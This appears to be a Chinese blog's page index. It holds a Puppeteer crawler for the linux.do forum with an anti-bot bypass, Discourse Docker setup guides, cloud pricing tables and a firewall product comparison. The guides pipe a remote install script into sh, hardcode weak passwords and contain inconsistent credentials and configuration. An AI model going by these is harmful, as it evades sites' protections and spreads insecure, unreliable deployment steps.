[\u0026#39;zh-CN\u0026#39;, \u0026#39;zh\u0026#39;, \u0026#39;en\u0026#39;], }); window.chrome = { runtime: {} }; }); logger.info(\u0026#39;✅ 浏览器初始化成功\u0026#39;); } catch (error) { logger.error(\u0026#39;❌ 浏览器初始化失败:\u0026#39;, error); throw error; } } async crawlPosts() { if (this.isRunning) { logger.warn(\u0026#39; 采集任务已在运行中，跳过本次执行\u0026#39;); return this.lastResult; } this.isRunning = true; this.error = null; try { logger.info(\u0026#39; 开始采集帖子...\u0026#39;); await this.initBrowser(); const urls = [ \u0026#39;https://linux.do/c/resource/cloud-asset/94\u0026#39;, \u0026#39;https://linux.do/c/resource/cloud-asset/94.json\u0026#39; ]; let posts = []; for (const url of urls) { try { logger.info(` 尝试访问: ${url}`); await this.page.goto(url, { waitUntil: \u0026#39;domcontentloaded\u0026#39;, timeout: 30000 }); // 等待页面加载 await this.page.waitForTimeout(5000); const pageTitle = await this.page.title(); logger.info(` 页面标题: ${pageTitle}`); // 检查页面是否正常加载 if (!pageTitle.includes(\u0026#39;请稍候\u0026#39;) \u0026amp;\u0026amp; !pageTitle.includes(\u0026#39;Loading\u0026#39;)) { posts = await this.extractPosts(); if (posts.length \u0026gt; 0) { logger.info(` 从 ${url} 获取到 ${posts.length} 个帖子`); break; } } // 保存调试截图 const screenshotPath = path.join(__dirname, \u0026#39;../../debug\u0026#39;, `debug_${Date.now()}.png`); await this.ensureDirectoryExists(path.dirname(screenshotPath)); await this.page.screenshot({ path: screenshotPath }); } catch (error) { logger.error(` 访问 ${url} 失败:`, error.message); continue; } } // 如果还是没有获取到帖子，尝试用户行为模拟 if (posts.length === 0) { logger.info(\u0026#39; 尝试用户行为模拟...\u0026#39;); posts = await this.simulateUserBehavior(); } // 处理采集结果 const result = await this.processCrawlResult(posts); this.lastResult = result; this.lastCrawlTime = new Date().toISOString(); logger.info(` 采集完成: 发现 ${result.total} 个帖子，新增 ${result.new} 个`); return result; } catch (error) { this.error = error.message; logger.error(\u0026#39; 采集失败:\u0026#39;, error); throw error; } finally { this.isRunning = false; } } async extractPosts() { return await this.page.evaluate(() =\u0026gt; { const posts = []; // 多种选择器策略 const selectors = [ \u0026#39;.topic-list-item .main-link a.title\u0026#39;, \u0026#39;.topic-list tbody tr .main-link a\u0026#39;, \u0026#39;a.title\u0026#39;, \u0026#39;.topic-title a\u0026#39;, \u0026#39;a[href*=\u0026#34;/t/\u0026#34;]\u0026#39;, \u0026#39;.topic-list-body .topic-list-item a\u0026#39;, \u0026#39;.ember-view a[href*=\u0026#34;/t/\u0026#34;]\u0026#39; ]; for (const selector of selectors) { const elements = document.querySelectorAll(selector); if (elements.length \u0026gt; 0) { console.log(`使用选择器 \u0026#34;${selector}\u0026#34; 找到 ${elements.length} 个元素`); elements.forEach(element =\u0026gt; { const title = element.textContent?.trim() || element.getAttribute(\u0026#39;title\u0026#39;)?.trim(); const href = element.getAttribute(\u0026#39;href\u0026#39;); if (title \u0026amp;\u0026amp; href \u0026amp;\u0026amp; title.length \u0026gt; 3 \u0026amp;\u0026amp; href.includes(\u0026#39;/t/\u0026#39;)) { let fullLink = href; if (href.startsWith(\u0026#39;/\u0026#39;)) { fullLink = \u0026#39;https://linux.do\u0026#39; + href; } // 过滤无效链接 if (!title.includes(\u0026#39;回复\u0026#39;) \u0026amp;\u0026amp; !title.includes(\u0026#39;查看\u0026#39;) \u0026amp;\u0026amp; !title.includes(\u0026#39;更多\u0026#39;) \u0026amp;\u0026amp; !href.includes(\u0026#39;#\u0026#39;)) { if (!posts.some(p =\u0026gt; p.link === fullLink)) { posts.push({ title: title, link: fullLink }); } } } }); if (posts.length \u0026gt; 0) { break; } } } return posts; }); } async simulateUserBehavior() { try { logger.info(\u0026#39; 模拟用户行为访问云资产版块...\u0026#39;); // 直接访问云资产版块 await this.page.goto(\u0026#39;https://xxx.xx/c/xx/cloud-asset/94\u0026#39;, { waitUntil: \u0026#39;domcontentloaded\u0026#39;, timeout: 30000 }); // 等待页面加载 await this.page.waitForTimeout(8000); // 尝试滚动页面加载更多内容 await this.page.evaluate(() =\u0026gt; { window.scrollTo(0, document.body.scrollHeight); }); await this.page.waitForTimeout(3000); await this.page.evaluate(() =\u0026gt; { window.scrollTo(0, 0); }); await this.page.waitForTimeout(2000); const posts = await this.extractPosts(); if (posts.length \u0026gt; 0) { logger.info(`✅ 通过用户行为模拟从云资产版块获取到 ${posts.length} 个帖子`); } return posts; } catch (error) { logger.error(\u0026#39;❌ 用户行为模拟失败:\u0026#39;, error); return []; } } async processCrawlResult(posts) { if (posts.length === 0) { return { total: 0, new: 0, posts: [] }; } // 添加时间戳 const postsWithTime = posts.map(post =\u0026gt; ({ ...post, created_at: new Date().toISOString(), id: this.generateId(post.link) })); // 保存到数据模型 const newCount = await this.postModel.savePosts(postsWithTime); return { total: postsWithTime.length, new: newCount, posts: postsWithTime }; } generateId(link) { // 从链接中提取ID或生成唯一ID const match = link.match(/\\/t\\/[^\\/]+\\/(\\d+)/); return match ? match[1] : Date.now().toString(); } async ensureDirectoryExists(dir) { try { await fs.access(dir); } catch { await fs.mkdir(dir, { recursive: true }); } } getStatus() { return { isRunning: this.isRunning, lastCrawlTime: this.lastCrawlTime, lastResult: this.lastResult, error: this.error }; } async close() { if (this.browser) { await this.browser.close(); this.browser = null; this.page = null; logger.info(\u0026#39; 浏览器已关闭\u0026#39;); } } } module.exports = CrawlerService; //PostModel.js const fs = require(\u0026#39;fs\u0026#39;).promises; const path = require(\u0026#39;path\u0026#39;); const logger = require(\u0026#39;../utils/logger\u0026#39;); class PostModel { constructor() { this.dataFile = path.join(__dirname, \u0026#39;../../data/posts.json\u0026#39;); this.existingPosts = new Set(); this.posts = []; this.init(); } async init() { try { await this.ensureDataDirectory(); await this.loadPosts(); } catch (error) { logger.error(\u0026#39;PostModel初始化失败:\u0026#39;, error); } } async ensureDataDirectory() { const dataDir = path.dirname(this.dataFile); try { await fs.access(dataDir); } catch { await fs.mkdir(dataDir, { recursive: true }); } } async loadPosts() { try { const data = await fs.readFile(this.dataFile, \u0026#39;utf8\u0026#39;); this.posts = JSON.parse(data); // 构建已存在帖子的集合 this.existingPosts.clear(); this.posts.forEach(post =\u0026gt; { this.existingPosts.add(post.link); }); logger.info(`📚 已加载 ${this.posts.length} 个已存在的帖子`); } catch (error) { if (error.code === \u0026#39;ENOENT\u0026#39;) { logger.info(\u0026#39;📝 数据文件不存在，将创建新文件\u0026#39;); this.posts = []; } else { logger.error(\u0026#39;加载帖子数据失败:\u0026#39;, error); this.posts = []; } } } async savePosts(newPosts) { try { // 过滤出真正的新帖子 const uniqueNewPosts = newPosts.filter(post =\u0026gt; !this.existingPosts.has(post.link)); if (uniqueNewPosts.length === 0) { logger.info(\u0026#39;📝 没有新帖子需要保存\u0026#39;); return 0; } // 添加到现有帖子列表 this.posts.unshift(...uniqueNewPosts); // 按时间排序（最新的在前面） this.posts.sort((a, b) =\u0026gt; new Date(b.created_at) - new Date(a.created_at)); // 限制最大数量（可选，防止文件过大） const maxPosts = 1000; if (this.posts.length \u0026gt; maxPosts) { this.posts = this.posts.slice(0, maxPosts); } // 保存到文件 await fs.writeFile(this.dataFile, JSON.stringify(this.posts, null, 2), \u0026#39;utf8\u0026#39;); // 更新已存在帖子集合 uniqueNewPosts.forEach(post =\u0026gt; { this.existingPosts.add(post.link); }); logger.info(`💾 保存了 ${uniqueNewPosts.length} 个新帖子，总计 ${this.posts.length} 个帖子`); return uniqueNewPosts.length; } catch (error) { logger.error(\u0026#39;保存帖子失败:\u0026#39;, error); throw error; } } getPosts(page = 1, pageSize = 10) { const offset = (page - 1) * pageSize; const paginatedPosts = this.posts.slice(offset, offset + pageSize); return { posts: paginatedPosts, total: this.posts.length, page: page, pageSize: pageSize, totalPages: Math.ceil(this.posts.length / pageSize) }; } getStats() { const now = new Date(); const today = new Date(now.getFullYear(), now.getMonth(), now.getDate()); const yesterday = new Date(today.getTime() - 24 * 60 * 60 * 1000); const thisWeek = new Date(today.getTime() - 7 * 24 * 60 * 60 * 1000); const todayPosts = this.posts.filter(post =\u0026gt; new Date(post.created_at) \u0026gt;= today).length; const yesterdayPosts = this.posts.filter(post =\u0026gt; { const postDate = new Date(post.created_at); return postDate \u0026gt;= yesterday \u0026amp;\u0026amp; postDate \u0026lt; today; }).length; const thisWeekPosts = this.posts.filter(post =\u0026gt; new Date(post.created_at) \u0026gt;= thisWeek).length; return { total: this.posts.length, today: todayPosts, yesterday: yesterdayPosts, thisWeek: thisWeekPosts }; } searchPosts(keyword, page = 1, pageSize = 10) { const filteredPosts = this.posts.filter(post =\u0026gt; post.title.toLowerCase().includes(keyword.toLowerCase()) ); const offset = (page - 1) * pageSize; const paginatedPosts = filteredPosts.slice(offset, offset + pageSize); return { posts: paginatedPosts, total: filteredPosts.length, page: page, pageSize: pageSize, totalPages: Math.ceil(filteredPosts.length / pageSize), keyword: keyword }; } } module.exports = PostModel; 功能特性 ✅ 自动采集: 每30分钟自动采集最新帖子 ✅ 智能去重: 自动过滤重复帖子 ✅ 反爬虫绕过: 使用 Puppeteer 模拟真实浏览器行为 ✅ 分页展示: 支持分页浏览大量帖子数据 ✅ 搜索功能: 支持按标题关键词搜索帖子 ✅ 实时状态: 显示采集状态和统计信息 ✅ 响应式设计: 支持移动端访问 ✅ 日志记录: 完整的日志记录和错误追踪 项目结构 nodejs-crawler/ ├── src/ # 源代码目录 │ ├── app.js # 应用入口文件 │ ├── controllers/ # 控制器层 │ │ └── PostController.js # 帖子相关API控制器 │ ├── models/ # 数据模型层 │ │ └── PostModel.js # 帖子数据模型 │ ├── services/ # 服务层 │ │ ├── CrawlerService.js # 爬虫服务 │ │ └── SchedulerService.js # 定时任务服务 │ └── utils/ # 工具类 │ └── logger.js # 日志工具 ├── public/ # 静态文件目录 │ └── index.html # 前端页面 ├── data/ # 数据存储目录 │ └── posts.json # 帖子数据文件 ├── logs/ # 日志文件目录 │ ├── app.log # 应用日志 │ └── error.log # 错误日志 ├── debug/ # 调试文件目录 │ └── *.png # 调试截图 ├── package.json # 项目配置文件 └── README.md # 项目说明文档 技术栈 后端技术 Node.js: JavaScript 运行环境 Express.js: Web 应用框架 Puppeteer: 无头浏览器自动化 Winston: 日志记录 node-cron: 定时任务调度 Helmet: 安全中间件 前端技术 HTML5/CSS3: 页面结构和样式 JavaScript: 交互逻辑 Fetch API: 数据请求 响应式设计: 移动端适配 安装部署 环境要求 Node.js \u0026gt;= 16.0.0 npm \u0026gt;= 7.0.0 安装步骤 克隆项目 git clone \u0026lt;repository-url\u0026gt; cd nodejs-crawler 安装依赖 npm install 启动应用 # 生产环境 npm start # 开发环境（需要安装 nodemon） npm run dev 访问应用 前端页面: http://localhost:3000 API接口: http://localhost:3000/api/posts 健康检查: http://localhost:3000/health 🔧 API 接口 获取帖子列表 GET /api/posts?page=1\u0026amp;pageSize=10\u0026amp;keyword=搜索关键词 参数说明:\npage: 页码（默认1） pageSize: 每页数量（默认10，最大100） keyword: 搜索关键词（可选） 返回示例:\n{ \u0026#34;success\u0026#34;: true, \u0026#34;data\u0026#34;: { \u0026#34;posts\u0026#34;: [...], \u0026#34;total\u0026#34;: 100, \u0026#34;page\u0026#34;: 1, \u0026#34;pageSize\u0026#34;: 10, \u0026#34;totalPages\u0026#34;: 10 } } 手动触发采集 POST /api/crawl 获取采集状态 GET /api/status 获取统计信息 GET /api/stats ⚙️ 配置说明 环境变量 PORT: 服务端口（默认3000） NODE_ENV: 运行环境（development/production） LOG_LEVEL: 日志级别（debug/info/warn/error） 定时任务 默认每30分钟执行一次采集 可在 src/services/SchedulerService.js 中修改 cron 表达式 数据存储 使用 JSON 文件存储帖子数据 数据文件位置: data/posts.json 自动创建备份和日志轮转 故障排除 常见问题 采集失败\n检查网络连接 查看 logs/error.log 错误日志 检查目标网站是否可访问 端口占用\n修改环境变量 PORT 或停止占用端口的其他程序 权限问题\n确保有读写 data/ 和 logs/ 目录的权限 Linux/Mac 下可能需要 chmod 设置权限 调试模式 # 启用调试日志 LOG_LEVEL=debug npm start 开发说明 添加新功能 在对应的服务类中添加业务逻辑 在控制器中添加 API 接口 在前端页面中添加交互功能 代码规范 使用 ES6+ 语法 遵循 MVC 架构模式 添加适当的错误处理和日志记录 Docker Dockerfile\n# 使用官方 Node.js 18 LTS 镜像作为基础镜像 FROM node:18-slim # 设置工作目录 WORKDIR /app # 安装系统依赖（Puppeteer 需要的库） RUN apt-get update \u0026amp;\u0026amp; apt-get install -y \\ wget \\ gnupg \\ ca-certificates \\ procps \\ libxss1 \\ libgconf-2-4 \\ libxrandr2 \\ libasound2 \\ libpangocairo-1.0-0 \\ libatk1.0-0 \\ libcairo-gobject2 \\ libgtk-3-0 \\ libgdk-pixbuf2.0-0 \\ libxcomposite1 \\ libxcursor1 \\ libxdamage1 \\ libxi6 \\ libxtst6 \\ libnss3 \\ libcups2 \\ libxss1 \\ libxrandr2 \\ libasound2 \\ libpangocairo-1.0-0 \\ libatk1.0-0 \\ libcairo-gobject2 \\ libdrm2 \\ libxkbcommon0 \\ libatspi2.0-0 \\ fonts-liberation \\ libappindicator3-1 \\ libasound2 \\ libatk-bridge2.0-0 \\ libdrm2 \\ libgtk-3-0 \\ libnspr4 \\ libnss3 \\ libx11-xcb1 \\ libxcomposite1 \\ libxdamage1 \\ libxrandr2 \\ xdg-utils \\ \u0026amp;\u0026amp; rm -rf /var/lib/apt/lists/* # 复制 package.json 和 package-lock.json COPY package*.json ./ # 安装 Node.js 依赖 RUN npm ci --only=production # 复制应用代码 COPY . . # 创建必要的目录 RUN mkdir -p data logs debug # 设置权限 RUN chmod -R 755 /app # 暴露端口 EXPOSE 3000 # 设置环境变量 ENV NODE_ENV=production ENV PORT=3000 # 健康检查 HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \\ CMD curl -f http://localhost:3000/api/status || exit 1 # 启动应用 CMD [\u0026#34;npm\u0026#34;, \u0026#34;start\u0026#34;] docker-compose.yml\nversion: \u0026#39;3.8\u0026#39; services: linux-do-crawler: build: . container_name: linux-do-crawler restart: unless-stopped ports: - \u0026#34;3000:3000\u0026#34; environment: - NODE_ENV=production - PORT=3000 volumes: # 持久化数据目录 - ./data:/app/data # 持久化日志目录 - ./logs:/app/logs # 持久化调试截图目录 - ./debug:/app/debug networks: - crawler-network healthcheck: test: [\u0026#34;CMD\u0026#34;, \u0026#34;curl\u0026#34;, \u0026#34;-f\u0026#34;, \u0026#34;http://localhost:3000/api/status\u0026#34;] interval: 30s timeout: 10s retries: 3 start_period: 40s networks: crawler-network: driver: bridge 🚀 快速部署 方法一：一键部署脚本 复制项目文件到 Debian 系统 # 将整个 nodejs-crawler 目录复制到 Debian 系统 scp -r nodejs-crawler/ user@your-server:/home/user/ 运行一键部署脚本 cd nodejs-crawler chmod +x deploy.sh ./deploy.sh 脚本会自动完成：\n✅ 检查系统环境 ✅ 更新系统包 ✅ 安装 Docker 和 Docker Compose ✅ 构建镜像并启动服务 方法二：手动部署 # 添加执行权限 sudo chmod +x /usr/local/bin/docker-compose # 验证安装 docker-compose --version 部署应用\n进入项目目录 cd nodejs-crawler\n构建镜像 docker-compose build\n启动服务 docker-compose up -d\n## 📋 文件说明 ### Dockerfile - 基于 Node.js 18 LTS 镜像 - 安装 Puppeteer 所需的系统依赖 - 配置健康检查 - 暴露 3000 端口 ### docker-compose.yml - 定义服务配置 - 配置端口映射 (3000:3000) - 挂载数据持久化目录 - 设置健康检查和重启策略 ### .dockerignore - 排除不必要的文件 - 减小镜像体积 - 提高构建速度 ## 🔧 配置说明 ### 环境变量 ```yaml environment: - NODE_ENV=production - PORT=3000 数据持久化 volumes: - ./data:/app/data # 帖子数据 - ./logs:/app/logs # 日志文件 - ./debug:/app/debug # 调试截图 端口映射 ports: - \u0026#34;3000:3000\u0026#34; # 主机端口:容器端口 📊 监控和维护 健康检查 容器配置了健康检查，会定期检查 /api/status 端点：\n# 查看健康状态 docker-compose ps 日志管理 # 查看应用日志 docker-compose logs -f --tail=100 # 查看系统日志 sudo journalctl -u docker.service -f 数据备份 # 备份数据目录 tar -czf backup-$(date +%Y%m%d).tar.gz data/ logs/ # 恢复数据 tar -xzf backup-20250821.tar.gz 注意: 请确保服务器有足够的资源（至少 1GB RAM）和网络连接来运行 Puppeteer。\n","permalink":"https://qfsyso.github.io/posts/node-crawler/","summary":"Node.js Puppeteer 基于 Node.js + Puppeteer 的自动化帖子采集系统，专门用于采集资产版块的帖子信息。\n核心代码\n//app.js const express = require(\u0026#39;express\u0026#39;); const cors = require(\u0026#39;cors\u0026#39;); const helmet = require(\u0026#39;helmet\u0026#39;); const path = require(\u0026#39;path\u0026#39;); const logger = require(\u0026#39;./utils/logger\u0026#39;); const CrawlerService = require(\u0026#39;./services/CrawlerService\u0026#39;); const SchedulerService = require(\u0026#39;./services/SchedulerService\u0026#39;); const PostController = require(\u0026#39;./controllers/PostController\u0026#39;); class App { constructor() { this.app = express(); this.port = process.env.PORT || 3000; this.crawlerService = new CrawlerService(); this.schedulerService = new SchedulerService(this.crawlerService); this.postController = new PostController(this.crawlerService); this.initializeMiddlewares(); this.initializeRoutes(); this.initializeErrorHandling(); } initializeMiddlewares() { // 安全中间件 this.","title":"Node Crawler"},{"content":"Discourse 是由Stack Overflow联合创始人Jeff Atwood开发的开源论坛平台，旨在革新传统论坛软件形态\n注意：Discourse 官方建议至少 1GB 内存（2GB 更稳），必须有 域名，并且能解析到 的服务器公网 IP。\n准备环境 的服务器需要：\n系统：Ubuntu 22.04 或 Debian 11（官方推荐）\n已安装 Docker + Docker Compose\n# 安装 Docker curl -fsSL https://get.docker.com | sh # 安装 docker-compose sudo apt install -y docker-compose 获取 Discourse Docker 镜像 git clone https://github.com/discourse/discourse_docker.git /var/discourse cd /var/discourse 创建配置文件 运行：\nsudo ./discourse-setup 它会问 几个问题：\nHostname → 的域名（例如：forum.example.com） Email → 管理员邮箱（用来接收验证邮件） SMTP server → 邮件服务器地址（Discourse 必须配置邮件才能注册用户） SMTP port → 邮件服务器端口（常用 587） SMTP user name → 邮件账号 SMTP password → 邮件密码 启动论坛 sudo ./launcher start app 首次启动会自动拉取镜像并构建，大概 5~10 分钟。 访问 域名，就能看到 Discourse 安装向导，注册第一个管理员账号。\n后续管理 停止论坛：\nsudo ./launcher stop app 重启论坛：\nsudo ./launcher restart app 查看日志：\nsudo ./launcher logs app 特别提示： 邮件一定要能用，否则 注册管理员账号时收不到验证邮件。可以先用 mailgun、smtp.qq.com 等免费 SMTP。\nlocal 本地版 Discourse 部署（Docker Compose）\n这个版本适合新手测试，不适合生产环境，因为不支持真实邮件收发，注册时会直接自动激活账号。\n1. 安装 Docker 和 Docker Compose 如果没装：\ncurl -fsSL https://get.docker.com | sh sudo apt install -y docker-compose 2. 创建项目目录 mkdir discourse-local cd discourse-local 3. 创建 docker-compose.yml version: \u0026#39;3\u0026#39; services: postgresql: image: bitnami/postgresql:latest container_name: discourse_postgresql environment: - POSTGRESQL_USERNAME=bn_discourse - POSTGRESQL_PASSWORD=postgres123 - POSTGRESQL_DATABASE=bitnami_discourse volumes: - postgresql_data:/bitnami/postgresql restart: unless-stopped redis: image: bitnami/redis:latest container_name: discourse_redis environment: - REDIS_PASSWORD=redis123 volumes: - redis_data:/bitnami/redis restart: unless-stopped discourse: image: bitnami/discourse:latest container_name: discourse environment: - DISCOURSE_HOST=localhost - DISCOURSE_SKIP_EMAIL=1 - DISCOURSE_USERNAME=admin - DISCOURSE_PASSWORD=Admin12345 - DISCOURSE_EMAIL=admin@example.com - DISCOURSE_ENABLE_HTTPS=no - DISCOURSE_PORT=3000 - DISCOURSE_DATABASE_HOST=postgresql - DISCOURSE_DATABASE_PORT_NUMBER=5432 - DISCOURSE_DATABASE_USER=bn_discourse - DISCOURSE_DATABASE_PASSWORD=postgres123 - DISCOURSE_DATABASE_NAME=bitnami_discourse - DISCOURSE_REDIS_HOST=redis - DISCOURSE_REDIS_PASSWORD=redis123 ports: - \u0026#34;3000:3000\u0026#34; volumes: - discourse_data:/bitnami depends_on: - postgresql - redis restart: unless-stopped volumes: postgresql_data: redis_data: discourse_data: 4. 启动 Discourse docker-compose up -d 第一次启动会下载镜像，可能要几分钟。\n5. 访问论坛 浏览器打开：\nhttp://localhost:3000 登录账号：\n用户名：admin 密码：admin123\n这个版本注册新账号时会自动跳过邮箱验证，所以本地测试非常方便。\n6. 停止 / 重启 docker-compose stop # 停止 docker-compose start # 启动 docker-compose down # 停止并删除容器 把 邮箱验证 和 域名都去掉了， 可以直接跑起来玩论坛功能。 如果 之后要上线，只需要：\n改成 的域名（DISCOURSE_HOST）\n配置 SMTP 邮件服务器\n开启 HTTPS\n精简版 精简版 Discourse 本地免邮件部署，去掉一些不必要的插件和 HTTPS 依赖，直接本地跑，启动速度会比 Bitnami 官方快很多（大约 2~3 分钟就能用）。\n这个版本用 官方 Discourse 镜像 + 官方本地测试邮件配置，不用配置 SMTP，也不用域名，注册时邮箱验证直接跳过。\n1. 新建目录 mkdir discourse-local cd discourse-local 2. 创建 docker-compose.yml version: \u0026#39;3\u0026#39; services: postgres: image: postgres:13 container_name: discourse_postgres environment: POSTGRES_USER: discourse POSTGRES_PASSWORD: discourse POSTGRES_DB: discourse volumes: - postgres_data:/var/lib/postgresql/data restart: unless-stopped redis: image: redis:6 container_name: discourse_redis restart: unless-stopped discourse: image: discourse/base:2.0.20230710-0051 container_name: discourse depends_on: - postgres - redis ports: - \u0026#34;3000:3000\u0026#34; environment: DISCOURSE_DEVELOPER_EMAILS: \u0026#39;admin@example.com\u0026#39; DISCOURSE_HOSTNAME: \u0026#39;localhost\u0026#39; RAILS_ENV: development DISCOURSE_SKIP_EMAIL: \u0026#39;true\u0026#39; volumes: - discourse_data:/var/www/discourse restart: unless-stopped command: bash -c \u0026#34; git clone --depth 1 https://github.com/discourse/discourse.git /var/www/discourse \u0026amp;\u0026amp; cd /var/www/discourse \u0026amp;\u0026amp; bundle install --jobs 4 --without test development \u0026amp;\u0026amp; bundle exec rake db:create \u0026amp;\u0026amp; bundle exec rake db:migrate \u0026amp;\u0026amp; bundle exec rake assets:precompile \u0026amp;\u0026amp; bundle exec rails server -b 0.0.0.0 -p 3000 \u0026#34; volumes: postgres_data: discourse_data: 3. 启动 docker-compose up -d 第一次启动会：\n下载镜像 克隆 Discourse 源码 初始化数据库 启动 Rails 服务器 大约 2~3 分钟完成。 4. 访问 浏览器打开：\nhttp://localhost:3000\n直接注册一个账号即可（不会发邮件，账号自动激活）。\n5. 停止 / 重启 docker-compose stop docker-compose start 这个版本的优点：\n无需域名、邮件服务器\n本地跑，启动快\n注册直接跳过邮件验证\n架构 Web 层：多个 Discourse 容器（Docker）分担请求\n缓存层：Redis 独立部署，减少数据库压力\n数据库层：PostgreSQL 独立部署，并开启备份\n存储层：图片附件放到对象存储（AWS S3、阿里云 OSS、MinIO），减轻磁盘压力\nCDN：加速静态资源（图片、JS、CSS）\n组件说明 1. 前端层 CDN/静态缓存\n(Cloudflare/AliCDN)\n▸ 全球加速静态资源\n▸ DDoS防护\n▸ 边缘缓存 2. 接入层 Nginx 反向代理\n▸ SSL证书管理\n▸ 负载均衡（3个Discourse实例）\n▸ HTTP/2协议支持 3. 应用层 Discourse App集群 (Docker容器化部署)\n▸ 横向扩展的Web服务实例\n▸ 无状态设计（会话数据存Redis）\n▸ 动态请求处理 4. 数据层 PostgreSQL 数据库 (独立服务器)\n▸ 主数据存储\n▸ 用户/帖子/权限等核心数据\n▸ 定期备份机制 5. 缓存层 Redis 服务 (独立服务器)\n▸ 会话存储\n▸ 后台任务队列\n▸ 热点数据缓存 6. 存储层 对象存储 (S3/OSS/MinIO)\n▸ 海量静态文件存储\n▸ 图片/视频/附件分离存储\n▸ 高可用设计 注：此架构具有以下特点： 1.水平扩展能力（可随时增加Discourse实例）\n2.动静分离（CDN+对象存储处理静态资源）\n3.数据库与缓存分离确保性能\n4.全站HTTPS加密（SSL在Nginx层终止）\n对照表\n场景 CPU 内存 磁盘 带宽 架构建议 个人测试 / \u0026lt;50 并发 2核 2GB 20GB SSD 5M 单机 Docker 小型社区 / ~200 并发 2核 4GB 50GB SSD 10M 单机 Docker，CDN 静态加速 中型社区 / ~1000 并发 4核 8GB 100GB SSD 20M 单机 + 独立数据库 + CDN 大型社区 / 5000 并发 8核+ 16GB 200GB SSD 50M+ 分布式部署 + 负载均衡 + 对象存储 ","permalink":"https://qfsyso.github.io/posts/discourse/","summary":"Discourse 是由Stack Overflow联合创始人Jeff Atwood开发的开源论坛平台，旨在革新传统论坛软件形态\n注意：Discourse 官方建议至少 1GB 内存（2GB 更稳），必须有 域名，并且能解析到 的服务器公网 IP。\n准备环境 的服务器需要：\n系统：Ubuntu 22.04 或 Debian 11（官方推荐）\n已安装 Docker + Docker Compose\n# 安装 Docker curl -fsSL https://get.docker.com | sh # 安装 docker-compose sudo apt install -y docker-compose 获取 Discourse Docker 镜像 git clone https://github.com/discourse/discourse_docker.git /var/discourse cd /var/discourse 创建配置文件 运行：\nsudo ./discourse-setup 它会问 几个问题：\nHostname → 的域名（例如：forum.example.com） Email → 管理员邮箱（用来接收验证邮件） SMTP server → 邮件服务器地址（Discourse 必须配置邮件才能注册用户） SMTP port → 邮件服务器端口（常用 587） SMTP user name → 邮件账号 SMTP password → 邮件密码 启动论坛 sudo .","title":"Discourse"},{"content":"2025 年 8 月 11 日云服务器价格对比 阿里云 云服务器 ECS 配置 地区 带宽 (M) 系统盘 (GB) 价格 (元/月) 价格 (元/年) 备注 2C4G 杭州 5 40 330.91 2929 2C4G 杭州 5 40 - 2088 新用户优惠 2C4G 香港 5 40 535 4809 轻量云服务器 配置 地区 带宽 (M) 系统盘 (GB) 价格 (元/月) 价格 (元/年) 备注 2C4G 杭州 共享 200 50 70 714 4C8G 杭州 共享 200 70 220 2244 2C4G 杭州 共享 200 50 112 1142 4C8G 香港 共享 200 70 224 2284 腾讯云 云服务器 CVM 配置 地区 带宽 (M) 系统盘 (GB) 价格 (元/月) 价格 (元/年) 备注 2C4G 广州 5 50 156 1256 2C4G 香港 5 40 202.41 2018.47 2C4G 广州/上海/北京/成都/南京 5 - - 1298.88 新用户优惠 4C8G 上海/广州/北京/成都/南京 10 - - 630 轻量云新用户 轻量云服务器 配置 地区 带宽 (M) 系统盘 (GB) 价格 (元/月) 价格 (元/年) 备注 2C4G 广州 共享 200 120 72 734 4C8G 广州 共享 200 120 230 2346 4C8G 香港 共享 200 120 280 2856 AWS 亚马逊云 云服务器 配置 地区 带宽 (GB 出站) 系统盘 (GB) 价格 (元/月) 价格 (元/年) 备注 2C4G 香港 100 50 280 3350 Linux/Debian 2C4G 香港 100 50 516 6200 Linux/Debian Azure 微软云 云服务器 配置 地区 带宽 (GB 出站) 系统盘 (GB) 价格 (元/月) 价格 (元/年) 备注 2C4G 香港 100 50 480 5800 Linux/Debian 4C8G 香港 100 50 910 10900 Linux/Debian 以上是 2025 年 8 月 11 日各大云服务提供商的部分云服务器价格对比。价格可能会随时间和促销活动变化，具体价格请以官方报价为准。\nLinux 防火墙及相关产品对比 基础防火墙工具 UFW (Uncomplicated Firewall) 简介：简单易用的防火墙管理工具，适合新手使用。 特点： 基于规则的防火墙管理。 支持简单的命令行操作。 可以轻松设置入站和出站规则。 适用场景： 个人用户或小型服务器。 需要快速配置基础防火墙规则的场景。 Fail2Ban 简介：用于防止暴力破解攻击的工具。 特点： 自动检测并禁止恶意 IP 地址。 支持多种服务（如 SSH、FTP 等）。 可配置性强，可以根据日志文件动态调整规则。 适用场景： 需要保护服务器免受暴力破解攻击。 适用于任何需要增强登录安全性的服务。 Linux 面板与 WAF 防火墙 1Panel WAF 防火墙 价格： 48 元/月 480 元/年 特点： 提供图形化界面，方便管理。 集成 WAF 功能，可有效防护 Web 攻击。 适用场景： 中小型企业或个人开发者需要简单易用的 Web 安全解决方案。 云服务提供商 阿里云 云防火墙 价格： 安全防护：按流量计费 100 GB：72.5 元/月，870 元/年 500 GB：216.5 元/月，2,598 元/年 1,000 GB：396.5 元/月，4,758 元/年 特点： 提供强大的流量分析和防护能力。 支持多种安全防护规则。 适合大规模企业级应用。 适用场景： 需要高流量防护的企业级用户。 对安全性和扩展性有较高要求的场景。 腾讯云 主机安全防护 价格： 540 元/3 个月 1999 元/年 云防火墙（等保 2.0） 价格： 14640 元/3 个月 49776 元/年 特点： 提供全面的安全防护服务。 支持等保 2.0 标准。 适合对合规性要求较高的企业。 适用场景： 需要满足等保 2.0 标准的企业。 对安全防护有高要求的云环境。 开源解决方案 JXWAF 简介：一款云 Web 应用防火墙。 特点： 云原生架构设计，支持弹性扩展和多节点集群部署。 深度融合 CDN 加速与安全防护能力。 自研语义分析引擎，降低误报率。 支持 Web 流量威胁检测系统（WebTDS）。 适用场景： 需要高性能、高扩展性的 Web 安全解决方案。 适合公有云、混合云及私有化环境。 GitHub 地址：JXWAF VeryNginx 简介：基于 OpenResty 的 Nginx 扩展，提供 WAF、控制面板和仪表盘。 特点： 提供强大的 WAF 功能，支持自定义规则。 支持多种自定义动作（如重定向、频率限制等）。 提供友好的 Web 界面，方便管理和监控。 适用场景： 需要灵活配置 Web 安全规则的用户。 适合对 Nginx 有深入了解的开发者。 GitHub 地址：VeryNginx 商业 WAF 产品 雷池 WAF 个人版 价格：永久免费（禁止商业用途） 特点： 资源占用低，适合个人开发者。 支持 Web 攻击防护、Bot 防护等功能。 专业版 价格：3600 元/年 特点： 提供高级流量统计、自定义拦截页面等功能。 支持多用户管理和高可用部署。 商业版 价格：17999 元/年（等保合规） 特点： 满足等保合规要求。 提供网页防篡改、多用户权限管理等功能。 适用场景： 个人开发者（个人版）。 小型团队或企业（专业版）。 